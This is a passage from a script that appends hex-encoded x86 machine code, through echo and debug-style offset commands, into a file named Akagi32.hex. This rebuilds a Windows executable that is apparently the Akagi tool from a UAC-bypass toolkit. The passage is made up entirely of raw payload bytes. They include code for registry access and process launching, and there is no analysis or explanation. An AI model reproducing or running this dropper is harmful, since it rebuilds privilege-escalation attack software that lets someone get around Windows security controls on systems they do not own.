echo 83 ec 0c a5 a5 a5 8b fc 8d 75 d8 53 53 a5 a5 a5 ff 15 c4 91 40 00 8b d8 85 db 74 38 ff 75 f4 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 89 45 fc 85 c0 74 15 ff 75 f4 ff 75 f0 50 e8 70 4f 00 00 8b 45 f4 83 c4 0c 89 45 f8 ff 75 f0 ff 15 c0 91 40 00 eb 08 6a 08 ff 15 d8 90 40 00 8b 4d 08 8b 45 fc 89 01 8b 4d 0c 8b 45 f8 89 01 eb 08 6a 0b ff 15 d8 90 40 00 8b c3 eb 0d 68 a0 00 00 00 ff>>Akagi32.hex
echo e 1780>>Akagi32.hex
echo 15 d8 90 40 00 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 83 ec 20 53 33 db 8b c2 56 57 8b f1 89 45 e4 89 5d fc 8b fb 89 7d ec 89 5d f8 89 5d e8 85 f6 0f 84 05 01 00 00 39 5d 08 0f 84 fc 00 00 00 39 5d 0c 0f 84 f3 00 00 00 85 c0 0f 84 eb 00 00 00 53 ff 15 d8 90 40 00 8d 45 fc 50 53 68 05 00 00 20 ff 15 4c d4 40 00 85 c0 0f 84 b9 00 00 00 39 5e 08 0f 84 b0 00 00 00 39 5e 04 0f 84 a7 00 00>>Akagi32.hex
echo e 1800>>Akagi32.hex
echo 00 ff 76 08 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b d8 89 5d e0 85 db 0f 84 89 00 00 00 8b 46 04 8d 7e 0c 8b d3 89 45 f0 8b 5d e8 8b c3 89 55 f4 8b 0f 03 c1 3b 45 e4 77 5a 8b 47 04 03 c3 3b 46 08 77 50 6a 00 ff 77 04 8d 41 fc 52 50 8d 47 08 50 ff 75 fc ff 15 48 d4 40 00 89 45 ec 85 c0 74 32 8b 55 f0 83 ea 01 89 55 f0 74 27 8b 0f 8b 45 f4 83 c1 04 03 47 04 03 f9 89 45 f4 8b 45>>Akagi32.hex
echo e 1880>>Akagi32.hex
echo f8 03 c1 03 5f 04 89 45 f8 3b 5e 08 77 07 85 d2 8b 55 f4 75 9d 8b 45 08 8b 4d 0c 8b 5d e0 8b 7d ec 89 18 8b 46 08 89 01 83 7d fc 00 74 09 ff 75 fc ff 15 50 d4 40 00 8b c7 eb 0d 68 a0 00 00 00 ff 15 d8 90 40 00 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 10 04 00 00 53 57 8b f9 33 db 85 ff 75 07 33 c0 e9 b9 00 00 00 b9 10 04 00 00 8d 85 f0 fb ff ff 88 18 40 83 e9 01 75 f8 56 ba b2 e2>>Akagi32.hex
echo e 1900>>Akagi32.hex
echo 40 00 8d 8d f0 fb ff ff e8 f0 ed ff ff ba 9c 95 40 00 e8 4e ed ff ff 8b cf e8 27 ee ff ff 8d 8d f0 fb ff ff 8b f0 e8 1a ee ff ff 03 f0 8d 04 75 0a 02 00 00 50 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f0 85 f6 74 49 ba b8 95 40 00 8b ce e8 a8 ed ff ff 8d 95 f0 fb ff ff e8 05 ed ff ff ba cc 95 40 00 8b ce e8 f9 ec ff ff 8b d7 8b ce e8 f0 ec ff ff 8b d6 b9 e4 95 40 00 e8 04 45 00>>Akagi32.hex
echo e 1980>>Akagi32.hex
echo 00 56 6a 00 ff 35 84 e0 40 00 8b d8 ff 15 ec 91 40 00 8d 85 f0 fb ff ff 50 ff 15 c4 90 40 00 8b c3 5e 5f 5b 8b e5 5d c3 55 8b ec 81 ec 30 0c 00 00 53 56 57 8b da 33 ff 8b f1 85 db 0f 84 b2 00 00 00 39 7d 08 0f 84 a9 00 00 00 ba a8 e0 40 00 8d 8d f0 fb ff ff e8 22 ed ff ff ba a8 e0 40 00 8d 8d d0 f3 ff ff e8 12 ed ff ff ba b2 e2 40 00 8d 8d e0 f7 ff ff e8 02 ed ff ff 83 ee 06 74 16>>Akagi32.hex
echo e 1a00>>Akagi32.hex
echo 83 ee 01 75 6f ba 34 96 40 00 e8 56 ec ff ff ba 50 96 40 00 eb 34 ba f4 95 40 00 8d 8d e0 f7 ff ff e8 3f ec ff ff be 0c 96 40 00 8d 8d d0 f3 ff ff 8b d6 e8 2d ec ff ff 8b d6 8d 8d f0 fb ff ff e8 20 ec ff ff ba 1c 96 40 00 8d 8d f0 fb ff ff e8 10 ec ff ff 8d 85 f0 fb ff ff 50 ff 15 9c 90 40 00 83 f8 ff 75 16 6a 02 5a b9 6c 96 40 00 e8 7d 41 00 00 33 c0 5f 5e 5b 8b e5 5d c3 ff 75 08>>Akagi32.hex
echo e 1a80>>Akagi32.hex
echo 8b d3 8d 8d e0 f7 ff ff e8 27 00 00 00 59 85 c0 74 1e 8d 8d d0 f3 ff ff e8 32 fe ff ff 85 c0 74 0f 33 d2 8d 8d f0 fb ff ff e8 d7 43 00 00 8b f8 8b c7 eb c2 55 8b ec 81 ec 10 04 00 00 53 33 db 56 8b f1 85 d2 74 75 39 5d 08 74 70 85 f6 74 6c ff 75 08 e8 ab 40 00 00 59 85 c0 74 5b b9 10 04 00 00 8d 85 f0 fb ff ff 88 18 40 83 e9 01 75 f8 57 ba b2 e2 40 00 8d 8d f0 fb ff ff e8 fc eb ff>>Akagi32.hex
echo e 1b00>>Akagi32.hex
echo ff ba 9c 95 40 00 e8 5a eb ff ff 8d 8d f0 fb ff ff e8 99 f7 ff ff 8b f8 85 ff 74 1b 8b ce e8 1d eb ff ff 50 8b d6 8b cf e8 86 f8 ff ff 59 8b cf 8b d8 e8 30 f9 ff ff 5f 8b c3 eb 02 33 c0 5e 5b 8b e5 5d c3 55 8b ec 51 56 33 f6 57 8b f9 89 75 fc 39 75 08 75 04 85 ff 74 66 8d 45 fc 50 68 88 96 40 00 68 01 00 00 80 ff 15 20 90 40 00 85 c0 75 3f 85 ff 74 10 68 0c 97 40 00 ff 75 fc ff 15>>Akagi32.hex
echo e 1b80>>Akagi32.hex
echo 04 90 40 00 eb 28 8b 4d 08 e8 b7 eb ff ff 8d 04 45 02 00 00 00 50 ff 75 08 6a 01 56 68 0c 97 40 00 ff 75 fc ff 15 08 90 40 00 85 c0 75 03 33 f6 46 83 7d fc 00 74 09 ff 75 fc ff 15 0c 90 40 00 5f 8b c6 5e 8b e5 5d c3 55 8b ec 81 ec 74 0a 00 00 83 65 f4 00 8b c1 53 33 db 89 45 f0 21 5d f8 21 5d fc 85 c0 75 07 33 c0 e9 03 03 00 00 39 1d 80 e0 40 00 74 10 8d 45 f4 50 6a 01 ff 15 54 92>>Akagi32.hex
echo e 1c00>>Akagi32.hex
echo 40 00 85 c0 78 e1 b9 10 04 00 00 8d 85 a4 fb ff ff 88 18 40 83 e9 01 75 f8 56 57 ba b2 e2 40 00 8d 8d a4 fb ff ff e8 d2 ea ff ff ba a0 96 40 00 e8 30 ea ff ff 8b 3d e8 90 40 00 8d 85 a4 fb ff ff 6a 00 50 ff d7 8b 35 2c 91 40 00 85 c0 75 0d ff d6 3d b7 00 00 00 0f 85 6f 02 00 00 8d 95 a4 fb ff ff 8d 8d 8c f5 ff ff e8 8f ea ff ff ba b0 96 40 00 e8 ed e9 ff ff 6a 00 8d 85 8c f5 ff ff>>Akagi32.hex
echo e 1c80>>Akagi32.hex
echo 50 ff d7 85 c0 75 0d ff d6 3d b7 00 00 00 0f 85 38 02 00 00 8d 85 a4 fb ff ff 33 c9 50 e8 a2 fe ff ff 59 85 c0 0f 84 21 02 00 00 ba 24 97 40 00 8d 8d a4 fb ff ff e8 aa e9 ff ff 6a 00 8d 85 a4 fb ff ff 50 ff d7 85 c0 75 0d ff d6 3d b7 00 00 00 0f 85 f5 01 00 00 ba 3c 97 40 00 8d 8d a4 fb ff ff e8 7e e9 ff ff 6a 00 8d 85 a4 fb ff ff 50 ff d7 85 c0 75 0d ff d6 3d b7 00 00 00 0f 85 c9>>Akagi32.hex
echo e 1d00>>Akagi32.hex
echo 01 00 00 ba 50 97 40 00 8d 8d a4 fb ff ff e8 52 e9 ff ff 6a 00 8d 85 a4 fb ff ff 50 ff d7 85 c0 75 0d ff d6 3d b7 00 00 00 0f 85 9d 01 00 00 ba 68 97 40 00 8d 8d a4 fb ff ff e8 26 e9 ff ff 6a 00 8d 85 a4 fb ff ff 50 ff d7 85 c0 75 0d ff d6 3d b7 00 00 00 0f 85 71 01 00 00 ba 7c 97 40 00 8d 8d a4 fb ff ff e8 fa e8 ff ff 6a 00 8d 85 a4 fb ff ff 50 ff d7 85 c0 75 0d ff d6 3d b7 00 00>>Akagi32.hex
echo e 1d80>>Akagi32.hex
echo 00 0f 85 45 01 00 00 6a 00 ff 15 ac 92 40 00 85 c0 0f 88 35 01 00 00 8d 45 fc 50 68 c0 92 40 00 6a 01 6a 00 68 00 93 40 00 ff 15 94 92 40 00 85 c0 0f 88 15 01 00 00 8b 45 fc ff 75 f0 50 8b 08 ff 51 50 8b 45 fc be a8 97 40 00 56 50 8b 08 ff 51 2c 8b 45 fc 68 ac 97 40 00 50 8b 08 ff 51 1c 8b 45 fc 8d 55 f8 52 68 d0 92 40 00 50 8b 08 ff 11 85 c0 0f 88 ca 00 00 00 8d 95 a4 fb ff ff 8d>>Akagi32.hex
echo e 1e00>>Akagi32.hex
echo 8d 8c f5 ff ff e8 f3 e8 ff ff ba c8 97 40 00 e8 51 e8 ff ff 8b 45 f8 8d 95 8c f5 ff ff 6a 01 52 50 8b 08 ff 51 18 85 c0 0f 88 95 00 00 00 8b 45 f8 50 8b 08 ff 51 08 ba b2 e2 40 00 8d 8d a4 fb ff ff e8 b6 e8 ff ff ba a0 96 40 00 e8 14 e8 ff ff 8d 95 a4 fb ff ff 8d 8d 8c f5 ff ff e8 9b e8 ff ff ba b0 96 40 00 e8 f9 e7 ff ff 6a 3c 5a 8b ca 8d 45 b4 88 18 40 83 e9 01 75 f8 8d 85 8c f5>>Akagi32.hex
echo e 1e80>>Akagi32.hex
echo ff ff 89 55 b4 89 45 c4 8d 85 a4 fb ff ff 89 45 cc 8d 45 b4 50 c7 45 b8 40 00 00 00 89 75 c8 c7 45 c0 fc 97 40 00 c7 45 d0 05 00 00 00 ff 15 78 91 40 00 85 c0 74 0c ff 75 ec ff 15 fc 90 40 00 33 db 43 8b 45 fc 50 8b 08 ff 51 08 83 3d 80 e0 40 00 00 5f 5e 74 0d 8d 45 f4 50 ff 75 f4 ff 15 54 92 40 00 33 c9 6a 00 41 e8 56 fc ff ff 59 8b c3 5b 8b e5 5d c3 55 8b ec 81 ec 18 04 00 00 53>>Akagi32.hex
echo e 1f00>>Akagi32.hex
echo 33 db 8b c2 21 5d fc 89 45 f8 57 8b f9 85 c0 0f 84 18 01 00 00 85 ff 75 07 b8 00 10 00 00 eb 07 e8 20 e8 ff ff 03 c0 56 50 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f0 85 f6 0f 84 da 00 00 00 85 ff 74 0b 8b d7 8b ce e8 af e7 ff ff eb 66 b9 10 04 00 00 8d 85 e8 fb ff ff 88 18 40 83 e9 01 75 f8 ba b2 e2 40 00 8d 8d e8 fb ff ff e8 8a e7 ff ff ba f4 95 40 00 e8 e8 e6 ff ff ff 75 0c>>Akagi32.hex
echo e 1f80>>Akagi32.hex
echo 8b 55 08 8d 8d e8 fb ff ff e8 f5 3b 00 00 59 85 c0 74 79 ba 0c 98 40 00 8b ce e8 5e e7 ff ff 8d 95 e8 fb ff ff e8 bb e6 ff ff ba 28 98 40 00 8b ce e8 af e6 ff ff 33 c9 8d 45 fc 51 50 51 68 00 00 00 02 51 51 51 68 48 98 40 00 68 01 00 00 80 ff 15 14 90 40 00 85 c0 75 32 8b ce e8 64 e7 ff ff 8d 04 45 02 00 00 00 50 56 6a 01 6a 00 68 a8 97 40 00 ff 75 fc ff 15 08 90 40 00 85 c0 75 0c>>Akagi32.hex
echo e 2000>>Akagi32.hex
echo 8b 4d f8 33 d2 e8 7b 3e 00 00 8b d8 56 6a 00 ff 35 84 e0 40 00 ff 15 ec 91 40 00 83 7d fc 00 5e 74 09 ff 75 fc ff 15 0c 90 40 00 8b c3 5f 5b 8b e5 5d c3 55 8b ec 81 ec 58 06 00 00 53 57 33 db 8d 45 f0 6a 08 89 5d f8 8b fb 89 5d fc 59 88 18 40 83 e9 01 75 f8 8b 45 08 8d 4d f0 56 53 53 83 c0 08 51 50 89 45 d4 ff 15 4c 92 40 00 84 c0 0f 84 45 02 00 00 6a 18 5e 53 53 6a 21 6a 01 6a 07>>Akagi32.hex
echo e 2080>>Akagi32.hex
echo 68 00 40 00 00 8d 45 f0 89 75 d8 89 45 e0 8d 45 c4 53 50 8d 45 d8 89 5d dc 50 68 01 00 10 00 8d 45 f8 c7 45 e4 40 00 00 00 50 89 5d e8 89 5d ec ff 15 3c 92 40 00 85 c0 0f 88 fc 01 00 00 68 00 00 10 00 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f8 89 7d cc 85 ff 0f 84 dc 01 00 00 53 53 8d 45 d8 89 75 d8 50 68 03 00 1f 00 8d 45 fc 89 5d dc 50 89 5d e4 89 5d e0 89 5d e8 89 5d ec ff>>Akagi32.hex
echo e 2100>>Akagi32.hex
echo 15 44 92 40 00 85 c0 0f 88 ad 01 00 00 6a 01 6a 01 68 00 00 10 00 57 8d 45 c4 50 53 53 ff 75 fc ff 75 f8 ff 15 34 92 40 00 8b d8 81 fb 03 01 00 00 75 0d 6a 00 6a 01 ff 75 fc ff 15 38 92 40 00 6a 00 ff 75 fc ff 15 40 92 40 00 8b f7 83 7e 04 01 0f 85 42 01 00 00 b9 0a 02 00 00 8d 85 b8 fd ff ff c6 00 00 40 83 e9 01 75 f7 8b 46 08 8d 8d b8 fd ff ff d1 e8 ba 04 01 00 00 50 8d 46 0c 50>>Akagi32.hex
echo e 2180>>Akagi32.hex
echo e8 da e5 ff ff 59 59 6a 2d 58 66 39 85 c8 fd ff ff 0f 85 02 01 00 00 66 39 85 d2 fd ff ff 0f 85 f5 00 00 00 66 39 85 dc fd ff ff 0f 85 e8 00 00 00 66 39 85 e6 fd ff ff 0f 85 db 00 00 00 8d 8d b8 fd ff ff e8 77 e4 ff ff ba a0 98 40 00 8b c8 e8 c9 e4 ff ff 85 c0 0f 85 bc 00 00 00 b9 10 04 00 00 8d 85 a8 f9 ff ff c6 00 00 40 83 e9 01 75 f7 8b 55 d4 8d 8d a8 f9 ff ff e8 fe e4 ff ff 66>>Akagi32.hex
echo e 2200>>Akagi32.hex
echo 8b 85 b8 fd ff ff 8d 8d b8 fd ff ff 8b d9 8b d1 66 85 c0 74 19 0f b7 f8 83 c1 02 66 83 ff 5c 8b c1 0f 45 c3 8b d8 0f b7 39 66 85 ff 75 ea 8d 85 b8 fd ff ff 33 c9 89 45 d0 8d bd b8 fd ff ff 8b c3 2b c7 33 ff 40 d1 e8 39 5d d0 0f 47 c7 85 c0 74 08 83 c2 02 41 3b c8 72 f8 33 c0 8d 8d a8 f9 ff ff 66 89 02 8d 95 b8 fd ff ff e8 f5 e3 ff ff ba c4 98 40 00 8d 8d a8 f9 ff ff e8 e5 e3 ff ff>>Akagi32.hex
echo e 2280>>Akagi32.hex
echo 8b 45 08 8d 8d a8 f9 ff ff ff 70 04 8b 10 e8 f0 38 00 00 59 bb 71 03 00 c0 81 fb 71 03 00 c0 74 0b 03 36 83 3e 00 0f 85 a1 fe ff ff 8b 7d cc 85 db 6a 00 5b 0f 89 53 fe ff ff 83 7d f4 00 74 0a 8d 45 f0 50 ff 15 50 92 40 00 83 7d f8 00 8b 35 48 92 40 00 74 05 ff 75 f8 ff d6 83 7d fc 00 74 05 ff 75 fc ff d6 5e 85 ff 74 0e 57 53 ff 35 84 e0 40 00 ff 15 ec 91 40 00 5f 33 c0 5b 8b e5 5d>>Akagi32.hex
echo e 2300>>Akagi32.hex
echo c3 55 8b ec 83 ec 44 53 56 57 bf 60 de 40 00 33 db be 14 02 00 00 8b c7 88 18 40 83 ee 01 75 f8 89 0d 60 de 40 00 b9 68 de 40 00 89 15 64 de 40 00 ba b2 e2 40 00 e8 c2 e3 ff ff 8d 45 f8 50 53 57 68 33 2b 40 00 53 53 ff 15 e0 90 40 00 89 45 fc 85 c0 74 71 6a 3c 5a 8b ca 8d 45 bc 88 18 40 83 e9 01 75 f8 8d 45 bc 89 55 bc 50 c7 45 c0 40 00 00 00 c7 45 cc e4 98 40 00 c7 45 d0 00 99 40>>Akagi32.hex
echo e 2380>>Akagi32.hex
echo 00 c7 45 d8 05 00 00 00 ff 15 78 91 40 00 8b 35 e4 90 40 00 8b 3d fc 90 40 00 85 c0 74 11 39 5d f4 74 0c 6a ff ff 75 f4 ff d6 ff 75 f4 ff d7 68 c0 27 09 00 ff 75 fc ff d6 ff 75 fc 33 c9 41 85 c0 0f 44 d9 ff d7 5f 5e 8b c3 5b 8b e5 5d c3 cc cc cc 55 8b ec 81 ec 18 02 00 00 53 33 db 21 5d fc 21 5d f8 56 8b f1 89 5d f4 39 1d 80 e0 40 00 74 17 8d 45 f8 50 6a 01 ff 15 54 92 40 00 85 c0>>Akagi32.hex
echo e 2400>>Akagi32.hex
echo 79 07 33 c0 e9 4a 01 00 00 85 f6 75 07 b8 00 10 00 00 eb 09 8b ce e8 2a e3 ff ff 03 c0 57 50 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f8 85 ff 0f 84 03 01 00 00 85 f6 74 04 8b d6 eb 2b b9 0a 02 00 00 8d 85 e8 fd ff ff 88 18 40 83 e9 01 75 f8 51 8d 95 e8 fd ff ff b9 78 99 40 00 e8 67 3e 00 00 59 8d 95 e8 fd ff ff 8b cf e8 8c e2 ff ff b9 34 ae 40 00 e8 ca e2 ff ff 8d 04 45 6c 00>>Akagi32.hex
echo e 2480>>Akagi32.hex
echo 00 00 50 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b 1d ec 91 40 00 8b f0 85 f6 0f 84 8b 00 00 00 ba b8 99 40 00 8b ce e8 50 e2 ff ff ba 34 ae 40 00 e8 ae e1 ff ff 33 c9 8d 45 fc 51 50 51 68 00 00 00 02 51 51 51 56 68 01 00 00 80 ff 15 14 90 40 00 85 c0 75 4a 8b cf e8 67 e2 ff ff 8d 04 45 02 00 00 00 50 57 6a 01 6a 00 68 a8 97 40 00 ff 75 fc ff 15 08 90 40 00 85 c0 75 0f 33 d2 b9>>Akagi32.hex
echo e 2500>>Akagi32.hex
echo a4 9a 40 00 e8 7c 39 00 00 89 45 f4 ff 75 fc ff 15 0c 90 40 00 56 68 01 00 00 80 ff 15 18 90 40 00 56 6a 00 ff 35 84 e0 40 00 ff d3 57 6a 00 ff 35 84 e0 40 00 ff d3 8b 5d f4 83 3d 80 e0 40 00 00 5f 74 0d 8d 45 f8 50 ff 75 f8 ff 15 54 92 40 00 8b c3 5e 5b 8b e5 5d c3 55 8b ec 81 ec 2c 04 00 00 53 56 8b f1 33 db 21 5d fc 33 c9 41 39 1d 80 e0 40 00 74 16 8d 45 f0 50 51 ff 15 54 92 40>>Akagi32.hex
echo e 2580>>Akagi32.hex
echo 00 85 c0 79 07 33 c0 e9 43 01 00 00 85 f6 74 09 8b ce e8 ae e1 ff ff eb 36 b9 0a 02 00 00 8d 85 e0 fd ff ff 88 18 40 83 e9 01 75 f8 51 8d 95 e0 fd ff ff b9 78 99 40 00 e8 0d 3d 00 00 59 8d 8d e0 fd ff ff e8 7c e1 ff ff 8d b5 e0 fd ff ff 33 c9 89 45 f8 51 8d 45 fc 50 51 68 00 00 00 02 51 51 51 68 28 9a 40 00 68 01 00 00 80 ff 15 14 90 40 00 85 c0 0f 85 ae 00 00 00 8d 45 f4 c7 45 f4>>Akagi32.hex
echo e 2600>>Akagi32.hex
echo 08 02 00 00 50 8d 85 d4 fb ff ff 50 6a 00 6a 00 68 84 9a 40 00 ff 75 fc ff 15 10 90 40 00 33 c9 85 c0 8b 45 f8 6a 01 5a 0f 44 ca 8d 04 45 02 00 00 00 89 4d ec 50 56 8b 35 08 90 40 00 52 6a 00 68 84 9a 40 00 ff 75 fc ff d6 85 c0 75 5a ba a8 e0 40 00 8d 8d e0 fd ff ff e8 9f e0 ff ff ba a4 9a 40 00 e8 fd df ff ff ba b8 9a 40 00 8d 8d e0 fd ff ff e8 0d 38 00 00 83 7d ec 00 8b d8 75 10>>Akagi32.hex
echo e 2680>>Akagi32.hex
echo 68 84 9a 40 00 ff 75 fc ff 15 04 90 40 00 eb 18 ff 75 f4 8d 85 d4 fb ff ff 50 6a 01 6a 00 68 84 9a 40 00 ff 75 fc ff d6 83 7d fc 00 74 09 ff 75 fc ff 15 0c 90 40 00 83 3d 80 e0 40 00 00 74 0d 8d 45 f0 50 ff 75 f0 ff 15 54 92 40 00 8b c3 5e 5b 8b e5 5d c3 55 8b ec 83 ec 24 53 56 57 8b f9 33 db 89 5d fc be 05 40 00 80 85 ff 74 7a 8d 45 dc 50 68 d8 9a 40 00 ff 15 a4 92 40 00 85 c0 75>>Akagi32.hex
echo e 2700>>Akagi32.hex
echo 5a 8d 45 ec 50 68 28 9b 40 00 ff 15 a0 92 40 00 85 c0 75 47 8d 45 fc 50 8d 45 ec 50 6a 07 53 8d 45 dc 50 ff 15 94 92 40 00 8b f0 85 f6 75 2c 8d 45 fc b9 d8 9a 40 00 50 8d 45 ec 50 6a 04 5a e8 a2 30 00 00 8b f0 59 59 85 f6 75 0f 8b 45 fc 53 53 57 8b 08 53 50 ff 51 0c 8b f0 8b 4d fc 85 c9 74 06 8b 01 51 ff 50 08 f7 d6 c1 ee 1f 5f 8b c6 5e 5b 8b e5 5d c3 55 8b ec 81 ec 9c 02 00 00 56>>Akagi32.hex
echo e 2780>>Akagi32.hex
echo 57 8b f9 33 f6 89 75 fc 85 ff 0f 84 c0 00 00 00 53 8d 45 ec 50 ff 15 98 92 40 00 bb 01 00 00 80 85 c0 0f 85 8a 00 00 00 ba 78 9b 40 00 8d 8d 64 fd ff ff e8 45 df ff ff 6a 40 8d 85 6c ff ff ff 50 8d 45 ec 50 ff 15 9c 92 40 00 85 c0 74 63 8d 95 6c ff ff ff 8d 8d 64 fd ff ff e8 85 de ff ff 56 8d 45 fc 50 56 68 00 00 00 02 56 56 56 8d 85 64 fd ff ff 50 53 ff 15 14 90 40 00 85 c0 75 32>>Akagi32.hex
echo e 2800>>Akagi32.hex
echo 8b cf e8 3e df ff ff 8d 04 45 02 00 00 00 50 57 6a 01 56 68 e4 9b 40 00 ff 75 fc ff 15 08 90 40 00 85 c0 75 0d 8d 8d 6c ff ff ff e8 a5 fe ff ff 8b f0 83 7d fc 00 74 17 ff 75 fc ff 15 0c 90 40 00 8d 85 64 fd ff ff 50 53 ff 15 18 90 40 00 5b 5f 8b c6 5e 8b e5 5d c3 55 8b ec 81 ec 34 0c 00 00 53 8b c2 33 db 89 45 fc 56 8b f1 85 c0 0f 84 ff 00 00 00 85 f6 0f 84 f7 00 00 00 b9 10 04 00>>Akagi32.hex
echo e 2880>>Akagi32.hex
echo 00 8d 85 cc f3 ff ff 88 18 40 83 e9 01 75 f8 57 ba a8 e0 40 00 8d 8d cc f3 ff ff e8 5d de ff ff ba 04 9c 40 00 e8 bb dd ff ff bf 20 08 00 00 8d 85 dc f7 ff ff 8b cf 88 18 40 83 e9 01 75 f8 8d 8d dc f7 ff ff 39 5d 08 74 13 ba 1c 9c 40 00 e8 29 de ff ff 8b d6 e8 8a dd ff ff eb 07 8b d6 e8 19 de ff ff 8d 95 dc f7 ff ff 8d 8d cc f3 ff ff e8 90 35 00 00 85 c0 74 75 8b cf 8d 85 dc f7 ff>>Akagi32.hex
echo e 2900>>Akagi32.hex
echo ff 88 18 40 83 e9 01 75 f8 ba a8 e0 40 00 8d 8d dc f7 ff ff e8 e4 dd ff ff 8b 55 fc e8 44 dd ff ff 33 d2 8d 8d dc f7 ff ff e8 57 35 00 00 8b d8 8d 8d dc f7 ff ff c6 01 00 41 83 ef 01 75 f7 ba 24 9c 40 00 8d 8d dc f7 ff ff e8 ae dd ff ff 8b d6 e8 0f dd ff ff 8d 95 dc f7 ff ff 8d 8d cc f3 ff ff e8 1e 35 00 00 56 ff 15 c4 90 40 00 8b c3 5f eb 02 33 c0 5e 5b 8b e5 5d c3 55 8b ec 81 ec>>Akagi32.hex
echo e 2980>>Akagi32.hex
echo 40 04 00 00 8b c1 89 45 f8 57 85 c0 0f 84 c8 01 00 00 56 8b 35 98 92 40 00 8d 45 e0 50 ff d6 85 c0 0f 85 b0 01 00 00 8d 45 d0 50 ff d6 85 c0 0f 85 a2 01 00 00 b9 10 04 00 00 8d 85 c0 fb ff ff c6 00 00 40 83 e9 01 75 f7 ba b2 e2 40 00 8d 8d c0 fb ff ff e8 24 dd ff ff bf 34 9c 40 00 8b d7 e8 80 dc ff ff ba 40 9c 40 00 8d 8d c0 fb ff ff e8 70 dc ff ff 6a 00 8d 85 c0 fb ff ff 50 ff 15>>Akagi32.hex
echo e 2a00>>Akagi32.hex
echo 50 90 40 00 8b f0 85 f6 0f 84 49 01 00 00 53 8b 1d 30 90 40 00 68 01 70 00 00 56 ff d3 89 45 f0 85 c0 0f 84 12 01 00 00 57 8b 3d 44 90 40 00 68 01 60 00 00 56 ff d7 6a 01 68 23 40 00 00 56 ff 15 40 90 40 00 6a 10 8d 45 e0 50 68 07 90 00 00 56 ff 15 3c 90 40 00 68 02 70 00 00 56 ff d3 8b 1d 48 90 40 00 85 c0 74 04 50 56 ff d3 68 07 70 00 00 56 ff 15 30 90 40 00 89 45 f4 85 c0 0f 84>>Akagi32.hex
echo e 2a80>>Akagi32.hex
echo b0 00 00 00 68 50 96 40 00 68 01 60 00 00 56 ff d7 68 50 96 40 00 68 06 60 00 00 56 ff d7 68 4c 9c 40 00 68 05 60 00 00 56 ff d7 6a 10 8d 45 d0 50 68 04 90 00 00 56 ff 15 3c 90 40 00 68 08 70 00 00 56 ff 15 30 90 40 00 89 45 fc 85 c0 74 2d 68 60 9c 40 00 68 01 60 00 00 56 ff d7 68 64 9c 40 00 68 09 60 00 00 56 ff d7 68 50 96 40 00 68 15 60 00 00 56 ff d7 ff 75 fc 56 ff d3 68 09 70>>Akagi32.hex
echo e 2b00>>Akagi32.hex
echo 00 00 56 ff 15 30 90 40 00 89 45 fc 85 c0 74 1e 68 90 9c 40 00 68 01 60 00 00 56 ff d7 ff 75 f8 68 08 60 00 00 56 ff d7 ff 75 fc 56 ff d3 ff 75 f4 56 ff d3 ff 75 f0 56 ff d3 56 ff 15 38 90 40 00 6a 00 ba 50 96 40 00 8d 8d c0 fb ff ff e8 05 fd ff ff 59 5b eb 02 33 c0 5e 5f 8b e5 5d c3 55 8b ec 81 ec 58 08 00 00 83 4d f8 ff 8d 45 d8 53 56 8b 35 98 92 40 00 33 db 57 50 8b fa 89 4d f4>>Akagi32.hex
echo e 2b80>>Akagi32.hex
echo ff d6 85 c0 0f 85 25 03 00 00 8d 45 c8 50 ff d6 85 c0 0f 85 17 03 00 00 be 10 04 00 00 8d 85 b8 fb ff ff 8b ce 88 18 40 83 e9 01 75 f8 ba b2 e2 40 00 8d 8d b8 fb ff ff e8 40 db ff ff ba a8 9c 40 00 e8 9e da ff ff 8b 55 f4 8d 8d b8 fb ff ff 57 e8 ad 2f 00 00 59 85 c0 0f 84 cc 02 00 00 8d 85 a8 f7 ff ff 88 18 40 83 ee 01 75 f8 ba b2 e2 40 00 8d 8d a8 f7 ff ff e8 00 db ff ff ba b8 9c>>Akagi32.hex
echo e 2c00>>Akagi32.hex
echo 40 00 e8 5e da ff ff ba 40 9c 40 00 8d 8d a8 f7 ff ff e8 4e da ff ff 53 8d 85 a8 f7 ff ff 50 ff 15 50 90 40 00 8b f0 89 75 fc 85 f6 0f 84 79 02 00 00 8d 45 f8 bf 01 60 00 00 50 6a 01 6a 01 57 68 07 70 00 00 56 ff 15 34 90 40 00 85 c0 0f 84 57 02 00 00 ff 75 f8 56 ff 15 4c 90 40 00 85 c0 0f 84 45 02 00 00 ff 75 f8 56 ff 15 2c 90 40 00 56 ff 15 28 90 40 00 68 01 70 00 00 56 ff 15 30>>Akagi32.hex
echo e 2c80>>Akagi32.hex
echo 90 40 00 68 b8 9c 40 00 57 8b 3d 44 90 40 00 56 89 45 e8 ff d7 85 c0 0f 84 0e 02 00 00 6a 10 8d 45 d8 50 68 07 90 00 00 56 ff 15 3c 90 40 00 6a 01 68 23 40 00 00 56 ff 15 40 90 40 00 68 02 70 00 00 56 ff 15 30 90 40 00 68 05 70 00 00 56 89 45 ec ff 15 30 90 40 00 68 c8 9c 40 00 68 01 60 00 00 56 89 45 f4 ff d7 ba a8 e0 40 00 8d 8d b8 fb ff ff e8 05 da ff ff ba e4 9c 40 00 e8 63 d9>>Akagi32.hex
echo e 2d00>>Akagi32.hex
echo ff ff 6a 01 53 8d 85 b8 fb ff ff 50 ff 15 ec 90 40 00 8b c8 85 c9 0f 84 8f 01 00 00 8b 41 3c 51 8b 7c 08 28 89 7d f0 ff 15 a0 90 40 00 85 ff 0f 84 76 01 00 00 68 00 80 00 00 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f8 85 ff 74 65 8b 45 f0 8d 4f 14 ba e4 9c 40 00 c7 07 02 00 00 00 89 47 0c e8 96 d9 ff ff 8d 4f 54 85 c9 74 1a ba 00 9d 40 00 be ed 00 00 00 2b d1 8a 04 0a 88 01 41>>Akagi32.hex
echo e 2d80>>Akagi32.hex
